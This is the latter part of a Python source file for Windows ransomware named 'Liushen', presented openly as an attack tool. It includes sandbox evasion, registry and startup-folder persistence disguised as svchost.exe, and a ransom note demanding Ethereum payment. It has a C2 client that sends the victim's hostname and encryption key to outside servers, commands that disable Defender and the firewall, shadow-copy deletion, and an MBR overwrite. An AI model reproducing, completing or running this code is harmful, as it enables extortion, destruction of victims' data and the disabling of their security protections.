            self.logger.info(f"Files decrypted: {self.decrypted_count}")
            self.logger.info(f"Files failed: {len(self.failed_files)}")
            self.logger.info(f"Files skipped: {len(self.skipped_files)}")
            self.logger.info(f"Bytes processed: {self.bytes_processed:,}")
            self.logger.info(f"Total time: {elapsed:.2f} seconds")
            self.logger.info(f"Average speed: {speed:.2f} KB/s")
            
            return self.decrypted_count, self.failed_files
            
        except Exception as e:
            self.logger.exception(f"Directory decryption error: {e}")
            return self.decrypted_count, self.failed_files
    
    def _is_excluded(self, path: str) -> bool:
        """Check if path should be excluded"""
        parts = path.lower().split(os.sep)
        for part in parts:
            if part in Config().exclude_dirs:
                return True
        return False
    
    def _process_batch(self, files: List[str]):
        """Process a batch of files using thread pool"""
        if not files:
            return
        
        self.logger.debug(f"Processing batch of {len(files)} files")
        
        with ThreadPoolExecutor(max_workers=Config().max_workers) as executor:
            futures = {executor.submit(self.decrypt_file, f): f for f in files}
            
            for future in as_completed(futures):
                try:
                    future.result(timeout=Config().thread_timeout)
                except Exception as e:
                    path = futures[future]
                    with self.lock:
                        self.failed_files.append((path, str(e)))

# ==================== ANTI-ANALYSIS ====================
class AntiAnalysis:
    """Simple anti-analysis checks"""
    
    def __init__(self, logger: Logger):
        self.logger = logger
    
    @safe_execution(default_return=True)
    def check(self) -> bool:
        """Check if running in analysis environment"""
        # Random delay to simulate normal behavior
        time.sleep(random.uniform(1, 3))
        
        if psutil:
            try:
                # Check RAM size
                if psutil.virtual_memory().total < 2 * 1024**3:  # Less than 2GB
                    self.logger.warning("Low RAM detected")
                    return False
                
                # Check CPU cores
                if psutil.cpu_count() <= 1:
                    self.logger.warning("Single CPU detected")
                    return False
                
                # Check system uptime
                uptime = time.time() - psutil.boot_time()
                if uptime < 300:  # Less than 5 minutes
                    self.logger.warning("Low uptime detected")
                    return False
                    
            except Exception:
                pass
        
        return True

# ==================== PERSISTENCE ====================
class Persistence:
    """Windows persistence mechanisms"""
    
    def __init__(self, logger: Logger):
        self.logger = logger
        self.winapi = WindowsAPI(logger)
    
    @safe_execution(default_return=False)
    def install(self) -> bool:
        """Install persistence using multiple methods"""
        success = False
        
        # Method 1: HKCU Run registry
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            name = ''.join(random.choices(string.ascii_lowercase, k=8))
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
            self.logger.info("Registry persistence installed (HKCU)")
            success = True
        except Exception:
            pass
        
        # Method 2: Startup folder
        try:
            startup = os.path.join(
                os.environ.get('APPDATA', ''),
                r"Microsoft\Windows\Start Menu\Programs\Startup"
            )
            if os.path.exists(startup) and os.access(startup, os.W_OK):
                dest = os.path.join(startup, f"svchost.exe")
                shutil.copy2(sys.executable, dest)
                self.winapi.set_hidden(dest)
                self.logger.info("Startup folder persistence installed")
                success = True
        except Exception:
            pass
        
        return success

# ==================== RANSOM NOTE ====================
class RansomNote:
    """Ransom note creator"""
    
    def __init__(self, logger: Logger):
        self.logger = logger
        self.winapi = WindowsAPI(logger)
        self.config = Config()
    
    def create(self, victim_id: str, encrypted_count: int) -> int:
        """Create ransom notes in multiple locations"""
        note = self._generate(victim_id, encrypted_count)
        locations = self._get_locations()
        created = 0
        
        for location in locations:
            try:
                path = os.path.join(location, f"README_{victim_id}.txt")
                with open(path, 'w') as f:
                    f.write(note)
                self.winapi.set_hidden(path)
                created += 1
            except Exception:
                pass
        
        self.logger.info(f"Created {created} ransom notes")
        return created
    
    def _generate(self, victim_id: str, count: int) -> str:
        """Generate ransom note content"""
        return f"""
YOUR FILES HAVE BEEN ENCRYPTED

{count} of your files have been encrypted with AES-256.

All your documents, photos, databases and other important files
have been encrypted with military-grade encryption.

YOUR FILES ARE NOT DAMAGED!
They can be recovered.

TO RECOVER YOUR FILES:

1. Pay {self.config.ransom_amount} USD to Ethereum address:
   {self.config.eth_address}

2. Send payment confirmation with your Victim ID

3. You will receive decryption tool within 24 hours

YOUR VICTIM ID: {victim_id}

WARNINGS:
- Do NOT try to decrypt files yourself
- Do NOT rename encrypted files
- Any tampering will result in permanent data loss

CONTACT: liushen_support@protonmail.com
"""
    
    def _get_locations(self) -> List[str]:
        """Get all possible locations for ransom notes"""
        locations = set()
        
        # User directories
        user_dirs = [
            os.path.expanduser("~"),
            os.path.join(os.path.expanduser("~"), "Desktop"),
            os.path.join(os.path.expanduser("~"), "Documents"),
            os.path.join(os.path.expanduser("~"), "Downloads"),
        ]
        
        for directory in user_dirs:
            if os.path.exists(directory):
                locations.add(directory)
        
        # All drives
        for letter in string.ascii_uppercase:
            drive = f"{letter}:\\"
            if os.path.exists(drive):
                locations.add(drive)
        
        return list(locations)

# ==================== C2 CLIENT ====================
class C2Client:
    """Command and Control communication client"""
    
    def __init__(self, logger: Logger):
        self.logger = logger
        self.config = Config()
        self.session = None
        if requests:
            self.session = requests.Session()
    
    @safe_execution(default_return=False)
    def send(self, victim_id: str, count: int, files: Dict, key: bytes) -> bool:
        """Send encryption report to C2 server"""
        data = {
            'victim_id': victim_id,
            'count': count,
            'files': list(files.keys())[:5],
            'key': base64.b64encode(key).decode(),
            'hostname': socket.gethostname(),
            'timestamp': time.time()
        }
        
        # Try to send to C2 servers
        servers = [
            "https://api.liushen.com/report",
            "https://c2.liushen.net/api"
        ]
        
        for server in servers:
            try:
                if self.session:
                    response = self.session.post(server, json=data, timeout=5)
                    if response.status_code == 200:
                        self.logger.info("Report sent to C2 server")
                        return True
            except Exception:
                continue
        
        # Fallback: save locally
        try:
            cache_dir = os.path.join(tempfile.gettempdir(), '.cache')
            os.makedirs(cache_dir, exist_ok=True)
            path = os.path.join(cache_dir, f"report_{victim_id}.json")
            with open(path, 'w') as f:
                json.dump(data, f)
            self.logger.info("Report saved locally")
            return True
        except Exception:
            pass
        
        return False

# ==================== MAIN RANSOMWARE ====================
class LiushenRansomware:
    """Main ransomware class"""
    
    def __init__(self, debug: bool = False):
        self.start_time = time.time()
        self.logger = Logger()
        self.config = Config()
        
        # Generate unique victim ID
        entropy = f"{socket.gethostname()}{time.time()}{random.randint(1000,9999)}{os.getpid()}"
        self.victim_id = hashlib.sha256(entropy.encode()).hexdigest()[:16].upper()
        
        # Generate master key
        if get_random_bytes:
            self.master_key = get_random_bytes(32)
        else:
            self.master_key = os.urandom(32)
        
        # Initialize components
        self.winapi = WindowsAPI(self.logger)
        self.anti_analysis = AntiAnalysis(self.logger)
        self.persistence = Persistence(self.logger)
        self.ransom_note = RansomNote(self.logger)
        self.c2_client = C2Client(self.logger)
        
        self.logger.info(f"Liushen initialized - Victim ID: {self.victim_id}")
        self.logger.info(f"Windows {platform.release()} - Admin: {self.winapi.is_admin()}")
    
    def kill_processes(self) -> int:
        """Kill non-critical processes that might lock files"""
        if not psutil:
            return 0
        
        targets = ['outlook', 'excel', 'word', 'powerpnt', 'onenote',
                  'notepad', 'wordpad', 'thunderbird', 'msaccess']
        
        killed = 0
        for proc in psutil.process_iter(['name', 'pid']):
            try:
                name = proc.info['name'].lower()
                
                # Skip critical system processes
                if name in ['svchost.exe', 'services.exe', 'lsass.exe', 'winlogon.exe']:
                    continue
                
                for target in targets:
                    if target in name:
                        proc.terminate()
                        time.sleep(0.1)
                        if proc.is_running():
                            proc.kill()
                        killed += 1
                        self.logger.debug(f"Killed: {name}")
                        break
            except Exception:
                continue
        
        self.logger.info(f"Killed {killed} processes")
        return killed
    
    def disable_security(self) -> bool:
        """Disable Windows security features"""
        self.logger.info("Disabling security features")
        
        commands = [
            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
            'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
            'netsh advfirewall set allprofiles state off'
        ]
        
        if self.winapi.is_admin():
            commands.extend([
                'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
                'sc config WinDefend start= disabled',
                'net stop WinDefend /y'
            ])
        
        success_count = 0
        for cmd in commands:
            try:
                subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
                success_count += 1
            except Exception:
                pass
        
        # Also kill security processes
        self.kill_processes()
        
        return success_count > 0
    
    def delete_shadows(self):
        """Delete volume shadow copies"""
        commands = [
            'vssadmin delete shadows /all /quiet',
            'wmic shadowcopy delete'
        ]
        
        for cmd in commands:
            try:
                subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
            except Exception:
                continue
    
    def lock_mbr(self) -> bool:
        """Lock MBR with ransom message (requires admin)"""
        if not self.winapi.is_admin():
            return False
        
        try:
            # Create ransom message for MBR
            message = f"""
Liushen Ransomware
Pay {self.config.ransom_amount} USD to {self.config.eth_address}
Victim ID: {self.victim_id}
""".encode('utf-16le')[:446]
            
            # Open physical drive
            handle = self.winapi.kernel32.CreateFileW(
                "\\\\.\\PhysicalDrive0",
                0x10000000, 0, None, 3, 0, None
            )
            
            if handle and handle not in [-1, 0]:
                # Create MBR with message
                mbr = bytearray(512)
                mbr[:len(message)] = message
                mbr[510:512] = b'\x55\xAA'  # Boot signature
                
                bytes_written = ctypes.c_uint32(0)
                self.winapi.kernel32.WriteFile(
                    handle, bytes(mbr), 512,
                    ctypes.byref(bytes_written), None
                )
                self.winapi.kernel32.CloseHandle(handle)
                
                self.logger.info("MBR locked successfully")
                return True
        except Exception as e:
            self.logger.error(f"MBR lock failed: {e}")
        
        return False
    
    def run_encrypt(self) -> Dict:
        """Run encryption mode"""
        self.logger.info("=" * 50)
        self.logger.info("STARTING ENCRYPTION MODE")
        self.logger.info("=" * 50)
        
        try:
            # Phase 1: Anti-analysis
            self.logger.info("[Phase 1] Running anti-analysis checks")
            if not self.anti_analysis.check():
                return {'status': 'aborted', 'reason': 'analysis_detected'}
            
            # Phase 2: Check privileges
            is_admin = self.winapi.is_admin()
            self.logger.info(f"[Phase 2] Administrator privileges: {is_admin}")
            
            # Phase 3: Disable security
            self.logger.info("[Phase 3] Disabling security features")
            security_disabled = self.disable_security()
            
            # Phase 4: Kill processes
            self.logger.info("[Phase 4] Killing blocking processes")
            processes_killed = self.kill_processes()
            
            # Phase 5: Delete shadows
            self.logger.info("[Phase 5] Deleting shadow copies")
            self.delete_shadows()
            
            # Phase 6: Lock MBR (if admin)
            if is_admin:
                self.logger.info("[Phase 6] Locking MBR")
                self.lock_mbr()
            
            # Phase 7: Encrypt files
            self.logger.info("[Phase 7] Starting file encryption")
            encryptor = FileEncryptor(self.master_key, self.logger)
            encrypted_count, encrypted_files, failed_files = encryptor.encrypt_all()
            
            # Phase 8: Create ransom notes
            self.logger.info("[Phase 8] Creating ransom notes")
            notes_created = self.ransom_note.create(self.victim_id, encrypted_count)
            
            # Phase 9: Install persistence
            self.logger.info("[Phase 9] Installing persistence")
            persistence_installed = self.persistence.install()
            
            # Phase 10: Send report to C2
            self.logger.info("[Phase 10] Sending report to C2 server")
            report_sent = self.c2_client.send(
                self.victim_id, encrypted_count, encrypted_files, self.master_key
            )
            
            # Calculate elapsed time
            elapsed = time.time() - self.start_time
            
            # Prepare result
            result = {
                'status': 'success',
                'victim_id': self.victim_id,
                'encrypted': encrypted_count,
                'failed': len(failed_files),
                'notes': notes_created,
                'security_disabled': security_disabled,
                'processes_killed': processes_killed,
                'persistence': persistence_installed,
                'report_sent': report_sent,
                'elapsed': elapsed
            }
            
            self.logger.info("=" * 50)
            self.logger.info("ENCRYPTION COMPLETE")
            for key, value in result.items():
                self.logger.info(f"{key}: {value}")
            
            return result
            
        except Exception as e:
            self.logger.exception("Fatal error during encryption")
            return {'status': 'failed', 'error': str(e)}
    
    def run_decrypt(self, key_path: str = None, target_path: str = None) -> Dict:
        """Run decryption mode"""
        self.logger.info("=" * 50)
        self.logger.info("STARTING DECRYPTION MODE")
        self.logger.info("=" * 50)
        
        try:
            # Load decryption key
            key = None
            if key_path and os.path.exists(key_path):
                with open(key_path, 'rb') as f:
                    key = f.read()
                if len(key) == 32:
                    self.logger.info(f"Key loaded from: {key_path}")
            
            if not key:
                key = self._find_key()
            
            if not key:
                self.logger.error("No decryption key found")
                return {'status': 'failed', 'reason': 'no_key'}
            
            # Set target path
            if not target_path:
                drives = self.winapi.get_drives()
                target_path = drives[0] if drives else "C:\\"
            
            self.logger.info(f"Decryption target: {target_path}")
            
            # Decrypt files
            decryptor = FileDecryptor(key, self.logger)
            decrypted_count, failed_files = decryptor.decrypt_directory(target_path)
            
            # Calculate elapsed time
            elapsed = time.time() - self.start_time
            
            result = {
                'status': 'success',
                'victim_id': self.victim_id,
                'decrypted': decrypted_count,
                'failed': len(failed_files),
                'elapsed': elapsed
            }
            
            self.logger.info("=" * 50)
            self.logger.info("DECRYPTION COMPLETE")
            for key, value in result.items():
                self.logger.info(f"{key}: {value}")
            
            return result
            
        except Exception as e:
            self.logger.exception("Fatal error during decryption")
            return {'status': 'failed', 'error': str(e)}
    
    def _find_key(self) -> Optional[bytes]:
        """Find decryption key in common locations"""
        search_paths = [
            os.path.join(tempfile.gettempdir(), '.cache'),
            os.path.expanduser("~"),
            "C:\\"
        ]
        
        for path in search_paths:
            if not os.path.exists(path):
                continue
            
            try:
                for filename in os.listdir(path):
                    if filename.startswith('key_') and filename.endswith('.bin'):
                        full_path = os.path.join(path, filename)
                        with open(full_path, 'rb') as f:
                            key = f.read()
                        if len(key) == 32:
                            self.logger.info(f"Found key: {full_path}")
                            return key
            except Exception:
                continue
        
        return None

# ==================== MAIN ENTRY POINT ====================
def main():
    """Main entry point"""
    
    print("\nLiushen Ransomware")
    print("by ayyubi\n")
    
    # Check dependencies
    if not check_dependencies():
        print("[-] Failed to install required dependencies")
        sys.exit(1)
    
    # Parse arguments
    parser = argparse.ArgumentParser(description='Liushen Ransomware')
    parser.add_argument('-e', '--encrypt', action='store_true', help='Run encryption mode')
    parser.add_argument('-d', '--decrypt', action='store_true', help='Run decryption mode')
    parser.add_argument('-k', '--key', type=str, help='Decryption key file path')
    parser.add_argument('-p', '--path', type=str, help='Target path for decryption')
    parser.add_argument('--debug', action='store_true', help='Enable debug logging')
    
    args = parser.parse_args()
    
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(0)
    
    try:
        # Initialize ransomware
        ransomware = LiushenRansomware(debug=args.debug)
        print(f"[+] Victim ID: {ransomware.victim_id}")
        
        if args.encrypt:
            result = ransomware.run_encrypt()
            if result.get('status') == 'success':
                print(f"\n[+] Encryption complete: {result['encrypted']} files encrypted")
                sys.exit(0)
            else:
                print(f"\n[-] Encryption failed: {result.get('error', 'Unknown error')}")
                sys.exit(1)
        
        elif args.decrypt:
            result = ransomware.run_decrypt(key_path=args.key, target_path=args.path)
            if result.get('status') == 'success':
                print(f"\n[+] Decryption complete: {result['decrypted']} files decrypted")
                sys.exit(0)
            else:
                print(f"\n[-] Decryption failed: {result.get('reason', 'Unknown error')}")
                sys.exit(1)
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"\n[-] Fatal error: {e}")
        if args.debug:
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
